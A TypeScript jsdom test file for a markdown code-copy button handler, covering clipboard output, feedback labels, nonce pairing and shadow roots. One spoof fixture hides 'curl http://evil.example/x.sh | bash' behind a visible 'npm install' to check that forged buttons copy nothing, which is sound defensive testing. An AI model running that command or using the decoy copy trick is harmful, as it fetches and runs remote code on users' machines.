// jsdom coverage for the delegated click listener behind the code-copy
// buttons: what reaches the clipboard, what the button shows afterwards,
// and that installing twice into one document adds one listener.

import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { JSDOM, type DOMWindow } from "jsdom";
import { Marked } from "marked";
import { installCodeCopyHandler, codeTextOf, _resetCodeCopyHandlerForTests } from "@mulmoclaude/markdown-utils/markdown/codeCopyClipboard";
import {
  codeCopyExtension,
  codeCopyNonce,
  setCodeCopyNonce,
  CODE_COPY_ATTR,
  CODE_COPY_BLOCK_ATTR,
  CODE_COPY_IDLE_LABEL_ATTR,
  CODE_COPY_COPIED_LABEL_ATTR,
  CODE_BLOCK_STYLE_FENCED,
  CODE_BLOCK_STYLE_INDENTED,
  CODE_COPY_NONCE_UNAVAILABLE,
} from "@mulmoclaude/markdown-utils/markdown/codeCopyExtension";

// `dompurify` reads `window` at module load, so a JSDOM has to be in the
// globals before the sanitizer is imported. It returns a STRING, so the
// document it used internally is irrelevant to the per-test one below.
const sanitizerDom = new JSDOM("<!doctype html><html><body></body></html>");
(globalThis as { window?: unknown; document?: unknown }).window = sanitizerDom.window;
(globalThis as { window?: unknown; document?: unknown }).document = sanitizerDom.window.document;

const { sanitizeMarkdownHtml } = await import("@mulmoclaude/core/plugin-vue");

/** The listener awaits `clipboard.writeText`, so the assertions have to
 *  come after at least one microtask turn. */
/** jsdom hands back `Element`; `.click()` lives on HTMLElement. */
const isClickable = (value: Element): value is HTMLElement => "click" in value;

const settle = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));

interface Harness {
  document: Document;
  /** jsdom's own window type — the lib.dom `Window` lacks the
   *  constructors (`MouseEvent`) these tests dispatch through. */
  window: DOMWindow;
  button: HTMLElement;
  writes: string[];
  /** Set to reject the next write, standing in for a denied permission. */
  fail: { value: boolean };
}

/** A block shaped like the extension's output: highlight.js `<span>`s
 *  inside the `<code>` so the "copies textContent, not markup" claim is
 *  actually exercised. */
function harness(): Harness {
  const dom = new JSDOM("<!doctype html><body></body>");
  const { document } = dom.window;
  const { window } = dom;
  const writes: string[] = [];
  const fail = { value: false };
  Object.defineProperty(window.navigator, "clipboard", {
    configurable: true,
    value: {
      writeText: async (text: string): Promise<void> => {
        if (fail.value) throw new Error("denied");
        writes.push(text);
      },
    },
  });
  _resetCodeCopyHandlerForTests(document);
  // Mint the document nonce the way the app does — installing the handler
  // is what pairs the renderer with the listener — then stamp it on the
  // hand-built button so it is a LEGITIMATE one.
  installCodeCopyHandler(document);
  const nonce = codeCopyNonce();
  document.body.innerHTML = [
    `<div class="relative" ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
    `<button type="button" ${CODE_COPY_ATTR}="${nonce}" ${CODE_COPY_IDLE_LABEL_ATTR}="Copy code" ${CODE_COPY_COPIED_LABEL_ATTR}="Copied" class="text-gray-600" aria-label="Copy code" title="Copy code"><svg><rect></rect></svg></button>`,
    '<pre><code class="hljs language-ts"><span class="hljs-keyword">const</span> a = 1;</code></pre>',
    "</div>",
  ].join("");
  const button = document.querySelector<HTMLElement>(`[${CODE_COPY_ATTR}]`);
  assert.ok(button);
  return { document, window, button, writes, fail };
}

interface ScheduledRevert {
  revert: () => void;
  handle: number;
}

/** Replaces the window's timer pair with recorders, so the 2s feedback
 *  window costs no wall-clock and the test can inspect what was
 *  scheduled and what was cancelled. */
function installFakeTimers(view: DOMWindow, scheduled: ScheduledRevert[], cancelled: Set<number>): void {
  let nextHandle = 1;
  const fakeSetTimeout = (revert: () => void): number => {
    const handle = nextHandle;
    nextHandle += 1;
    scheduled.push({ revert, handle });
    return handle;
  };
  const fakeClearTimeout = (handle: number): void => {
    cancelled.add(handle);
  };
  const timers: { setTimeout: unknown; clearTimeout: unknown } = view;
  timers.setTimeout = fakeSetTimeout;
  timers.clearTimeout = fakeClearTimeout;
}

let env: Harness;
beforeEach(() => {
  env = harness();
});

describe("codeTextOf", () => {
  it("returns the code's text without highlight markup", () => {
    assert.equal(codeTextOf(env.button), "const a = 1;");
  });

  it("drops the renderer's trailing newline on an INDENTED block", () => {
    const block = env.document.querySelector(`[${CODE_COPY_BLOCK_ATTR}]`);
    const code = env.document.querySelector("code");
    assert.ok(block);
    assert.ok(code);
    block.setAttribute(CODE_COPY_BLOCK_ATTR, CODE_BLOCK_STYLE_INDENTED);
    code.textContent = "indented();\n";
    assert.equal(codeTextOf(env.button), "indented();");
  });

  it("keeps a FENCED block's trailing blank line, dropping only the last line's terminator", () => {
    // marked >= 18.2.1 renders "```js\na();\n\n```" as "a();\n\n": the
    // blank line plus its own terminator.
    const code = env.document.querySelector("code");
    assert.ok(code);
    code.textContent = "a();\n\n";
    assert.equal(codeTextOf(env.button), "a();\n");
  });

  it("returns null for a button with no code block around it", () => {
    const orphan = env.document.createElement("button");
    assert.equal(codeTextOf(orphan), null);
  });
});

describe("renderer / listener nonce pairing", () => {
  // Both of these pin invariants a mutation proved were untested: with
  // `setCodeCopyNonce` moved below the install guard, all 39 other tests
  // stayed green while plugin-rendered buttons would have gone inert.
  const markedForNonce = new Marked();
  markedForNonce.use(codeCopyExtension);

  const renderInto = (doc: Document, source: string): void => {
    doc.body.innerHTML = markedForNonce.parse(source) as string;
  };

  it("a second bundle's install adopts the document's nonce even though its listener install is a no-op", () => {
    // The host installs first and owns the only listener; the plugin then
    // installs into the same document. Its renderer is a SEPARATE module
    // instance with its own seed, and it has to end up on the host's
    // value or its buttons are refused.
    installCodeCopyHandler(env.document);
    const documentNonce = codeCopyNonce();
    setCodeCopyNonce("a-second-bundle-with-its-own-seed");
    installCodeCopyHandler(env.document);
    assert.equal(codeCopyNonce(), documentNonce);
  });

  it("two documents in one realm converge, so A/B/A still copies in A", async () => {
    // codex round 2 P3: pair A, pair B, re-render A. A fresh document
    // adopts the renderer's value rather than minting its own, so the
    // renderer never holds a nonce some paired document will refuse.
    const docB = new JSDOM("<!doctype html><body></body>").window.document;
    _resetCodeCopyHandlerForTests(docB);

    installCodeCopyHandler(env.document);
    renderInto(env.document, "```ts\nfromA();\n```");
    installCodeCopyHandler(docB);
    renderInto(docB, "```ts\nfromB();\n```");

    // Re-render A WITHOUT reinstalling — the step that used to break.
    renderInto(env.document, "```ts\nfromA();\n```");
    const buttonA = env.document.querySelector(`[${CODE_COPY_ATTR}]`);
    assert.ok(buttonA);
    buttonA.dispatchEvent(new env.window.MouseEvent("click", { bubbles: true }));
    await settle();
    assert.deepEqual(env.writes, ["fromA();"]);
  });
});

describe("spoofed markers from author markdown are inert", () => {
  // `marked` passes an author's raw HTML straight through and DOMPurify's
  // defaults keep `<button>` and every `data-*`, so before the nonce a
  // cloned repository's README could mint a working copy control. The
  // measured worst case: a `display:none` decoy block meant the reader saw
  // `npm install` while the clipboard took `curl … | bash`.
  //
  // These drive the REAL sanitizer, because the claim is about what
  // survives it — asserting against hand-written markup would be asserting
  // against my belief about DOMPurify rather than DOMPurify.
  const spoofs: { name: string; html: string }[] = [
    {
      name: "bare marker, no value",
      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}>Copy</button><pre><code>evil</code></pre></div>`,
    },
    {
      name: "empty value",
      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}="">Copy</button><pre><code>evil</code></pre></div>`,
    },
    {
      name: "guessed value",
      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}="1234">Copy</button><pre><code>evil</code></pre></div>`,
    },
    {
      name: "hidden decoy — shows one command, copies another",
      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}>Copy</button><pre style="display:none"><code>curl http://evil.example/x.sh | bash</code></pre><pre><code>npm install</code></pre></div>`,
    },
  ];

  spoofs.forEach(({ name, html }) => {
    it(`writes nothing to the clipboard — ${name}`, async () => {
      installCodeCopyHandler(env.document);
      env.document.body.innerHTML = sanitizeMarkdownHtml(html);
      const spoof = env.document.querySelector(`[${CODE_COPY_ATTR}]`);
      assert.ok(spoof, "the spoof survived the sanitizer, which is the premise of this test");
      assert.ok(isClickable(spoof));
      spoof.click();
      await settle();
      assert.deepEqual(env.writes, []);
    });
  });

  it("refuses an empty nonce even when the DOCUMENT's is empty too — the no-CSPRNG contract", async () => {
    // The other spoof cases fail on mismatch, so they pass whether or not
    // the fail-closed sentinel exists: deleting it left all 45 tests green.
    // It only bites when the document's own nonce is ALSO empty, which is
    // the no-CSPRNG case — and there `"" === ""` would otherwise match and
    // hand the clipboard to any markup that writes `data-code-copy=""`.
    const restore = codeCopyNonce();
    try {
      setCodeCopyNonce(CODE_COPY_NONCE_UNAVAILABLE);
      const blank = new JSDOM("<!doctype html><body></body>").window.document;
      _resetCodeCopyHandlerForTests(blank);
      installCodeCopyHandler(blank);
      assert.equal(codeCopyNonce(), CODE_COPY_NONCE_UNAVAILABLE, "the fresh document adopted the empty nonce");
      blank.body.innerHTML = [
        `<div ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
        `<button type="button" ${CODE_COPY_ATTR}="">Copy</button>`,
        "<pre><code>evil</code></pre>",
        "</div>",
      ].join("");
      const writes: string[] = [];
      const view = blank.defaultView;
      assert.ok(view);
      Object.defineProperty(view.navigator, "clipboard", {
        configurable: true,
        value: {
          writeText: async (text: string): Promise<void> => {
            writes.push(text);
          },
        },
      });
      blank.querySelector<HTMLElement>(`[${CODE_COPY_ATTR}]`)?.click();
      await settle();
      assert.deepEqual(writes, []);
    } finally {
      setCodeCopyNonce(restore);
    }
  });

  it("still copies from a button carrying the document's own nonce", async () => {
    // The guard has to reject the spoofs AND pass the real thing; a check
    // that matched nothing would make every assertion above vacuous.
    installCodeCopyHandler(env.document);
    env.button.click();
    await settle();
    assert.deepEqual(env.writes, ["const a = 1;"]);
  });
});

describe("codeTextOf over real marked output", () => {
  // The unit tests above set `textContent` by hand, which can only pin
  // what I believe marked produces. This drives the REAL renderer for
  // every fence shape whose trailing whitespace differs, and asserts the
  // clipboard gets back exactly what the author typed. It is the pair
  // that regressed once already: strip on a fence and the author's blank
  // line is gone; do not strip on an indented block and a line nobody
  // wrote is pasted.
  const marked = new Marked();
  marked.use(codeCopyExtension);

  const cases: { name: string; source: string; expected: string }[] = [
    { name: "fenced, no trailing blank line", source: "```js\na();\n```", expected: "a();" },
    { name: "fenced, one trailing blank line", source: "```js\na();\n\n```", expected: "a();\n" },
    { name: "fenced, two trailing blank lines", source: "```js\na();\n\n\n```", expected: "a();\n\n" },
    { name: "fenced, no language tag", source: "```\na();\n```", expected: "a();" },
    { name: "indented, 4 spaces", source: "para\n\n    a();\n", expected: "a();" },
    { name: "fenced, blank line in the MIDDLE", source: "```js\na();\n\nb();\n```", expected: "a();\n\nb();" },
  ];

  cases.forEach(({ name, source, expected }) => {
    it(`copies exactly what the author wrote — ${name}`, () => {
      env.document.body.innerHTML = marked.parse(source) as string;
      const button = env.document.querySelector(`[${CODE_COPY_ATTR}]`);
      assert.ok(button);
      assert.equal(codeTextOf(button), expected);
    });
  });
});

describe("installCodeCopyHandler", () => {
  it("copies the block's source on click", async () => {
    installCodeCopyHandler(env.document);
    env.button.click();
    await settle();
    assert.deepEqual(env.writes, ["const a = 1;"]);
  });

  it("copies when the click lands on the icon inside the button", async () => {
    installCodeCopyHandler(env.document);
    env.document.querySelector("rect")?.dispatchEvent(new env.window.MouseEvent("click", { bubbles: true }));
    await settle();
    assert.deepEqual(env.writes, ["const a = 1;"]);
  });

  it("shows the copied state after a successful copy", async () => {
    installCodeCopyHandler(env.document);
    env.button.click();
    await settle();
    assert.equal(env.button.getAttribute("aria-label"), "Copied");
    assert.equal(env.button.getAttribute("title"), "Copied");
    assert.ok(env.button.classList.contains("text-green-600"));
  });

  it("stays idle when the clipboard write is refused", async () => {
    installCodeCopyHandler(env.document);
    env.fail.value = true;
    env.button.click();
    await settle();
    assert.equal(env.button.getAttribute("aria-label"), "Copy code");
    assert.ok(!env.button.classList.contains("text-green-600"));
  });

  it("captions from the BUTTON, not from whoever installed the listener", async () => {
    // The plugin's buttons must not be captioned by the host's provider
    // just because the host installed the one surviving listener.
    installCodeCopyHandler(env.document);
    env.button.setAttribute(CODE_COPY_COPIED_LABEL_ATTR, "コピーしました");
    env.button.setAttribute(CODE_COPY_IDLE_LABEL_ATTR, "コードをコピー");
    env.button.click();
    await settle();
    assert.equal(env.button.getAttribute("aria-label"), "コピーしました");
  });

  it("installs once per document, so a second bundle's call adds no listener", async () => {
    installCodeCopyHandler(env.document);
    installCodeCopyHandler(env.document);
    env.button.click();
    await settle();
    assert.deepEqual(env.writes, ["const a = 1;"]);
  });

  it("serves a button injected after install — the point of delegating", async () => {
    installCodeCopyHandler(env.document);
    const later = env.document.createElement("div");
    later.innerHTML = [
      `<div ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
      `<button type="button" ${CODE_COPY_ATTR}="${codeCopyNonce()}"></button>`,
      "<pre><code>later();</code></pre>",
      "</div>",
    ].join("");
    env.document.body.appendChild(later);
    later.querySelector<HTMLElement>(`[${CODE_COPY_ATTR}]`)?.click();
    await settle();
    assert.deepEqual(env.writes, ["later();"]);
  });

  it("a second click restarts the confirmation instead of letting the first timer end it", async () => {
    // The first click's revert timer must be cancelled: left running, it
    // fires on the OLD schedule and clears the second click's feedback
    // early. Uses fake timers so the 2s window is not real wall-clock.
    installCodeCopyHandler(env.document);
    const view = env.window;
    const scheduled: ScheduledRevert[] = [];
    const cancelled = new Set<number>();
    installFakeTimers(view, scheduled, cancelled);

    env.button.click();
    await settle();
    env.button.click();
    await settle();

    assert.equal(scheduled.length, 2, "each click schedules its own revert");
    const [stale] = scheduled;
    assert.ok(stale);
    assert.ok(cancelled.has(stale.handle), "the first click's revert was cancelled");
    // Belt and braces: even if the cancelled timer still fires (already
    // dispatched when the second click landed), it must not clear the
    // live confirmation.
    stale.revert();
    assert.equal(env.button.getAttribute("aria-label"), "Copied");
  });

  it("restores the button's own idle label when reverting", async () => {
    installCodeCopyHandler(env.document);
    const scheduled: ScheduledRevert[] = [];
    installFakeTimers(env.window, scheduled, new Set<number>());

    env.button.click();
    await settle();
    assert.equal(env.button.getAttribute("aria-label"), "Copied");

    const [revert] = scheduled;
    assert.ok(revert);
    revert.revert();
    assert.equal(env.button.getAttribute("aria-label"), "Copy code");
    assert.equal(env.button.getAttribute("title"), "Copy code");
  });

  it("ignores a click outside any copy button", async () => {
    installCodeCopyHandler(env.document);
    env.document.querySelector("pre")?.dispatchEvent(new env.window.MouseEvent("click", { bubbles: true }));
    await settle();
    assert.deepEqual(env.writes, []);
  });
});

describe("inside an open shadow root", () => {
  // MulmoTerminal mounts plugin views in a shadow root. The document-level
  // listener then sees `event.target` retargeted to the HOST, so these
  // pin that the button is still found — and that the nonce still guards it.
  function mountInShadow(nonceAttr: string): ShadowRoot {
    const host = env.document.createElement("div");
    env.document.body.appendChild(host);
    const shadow = host.attachShadow({ mode: "open" });
    shadow.innerHTML = [
      `<div ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
      `<button type="button" ${nonceAttr}><svg><rect></rect></svg></button>`,
      "<pre><code>shadowed();</code></pre>",
      "</div>",
    ].join("");
    return shadow;
  }

  function clickComposed(node: Element | null): void {
    assert.ok(node);
    node.dispatchEvent(new env.window.MouseEvent("click", { bubbles: true, composed: true }));
  }

  it("copies from a legitimate button", async () => {
    const shadow = mountInShadow(`${CODE_COPY_ATTR}="${codeCopyNonce()}"`);
    clickComposed(shadow.querySelector("button"));
    await settle();
    assert.deepEqual(env.writes, ["shadowed();"]);
  });

  it("copies when the click lands on the icon inside the button", async () => {
    const shadow = mountInShadow(`${CODE_COPY_ATTR}="${codeCopyNonce()}"`);
    clickComposed(shadow.querySelector("rect"));
    await settle();
    assert.deepEqual(env.writes, ["shadowed();"]);
  });

  it("shows the copied state on the shadowed button", async () => {
    const shadow = mountInShadow(`${CODE_COPY_ATTR}="${codeCopyNonce()}" ${CODE_COPY_COPIED_LABEL_ATTR}="Copied"`);
    const button = shadow.querySelector("button");
    clickComposed(button);
    await settle();
    assert.equal(button?.getAttribute("aria-label"), "Copied");
  });

  const spoofs: { name: string; attr: string }[] = [
    { name: "bare marker", attr: CODE_COPY_ATTR },
    { name: "empty value", attr: `${CODE_COPY_ATTR}=""` },
    { name: "guessed value", attr: `${CODE_COPY_ATTR}="1234"` },
  ];
  spoofs.forEach(({ name, attr }) => {
    it(`writes nothing for a spoofed button — ${name}`, async () => {
      const shadow = mountInShadow(attr);
      clickComposed(shadow.querySelector("button"));
      await settle();
      assert.deepEqual(env.writes, []);
    });
  });

  it("ignores a click inside the shadow root but outside any copy button", async () => {
    const shadow = mountInShadow(`${CODE_COPY_ATTR}="${codeCopyNonce()}"`);
    clickComposed(shadow.querySelector("pre"));
    await settle();
    assert.deepEqual(env.writes, []);
  });
});
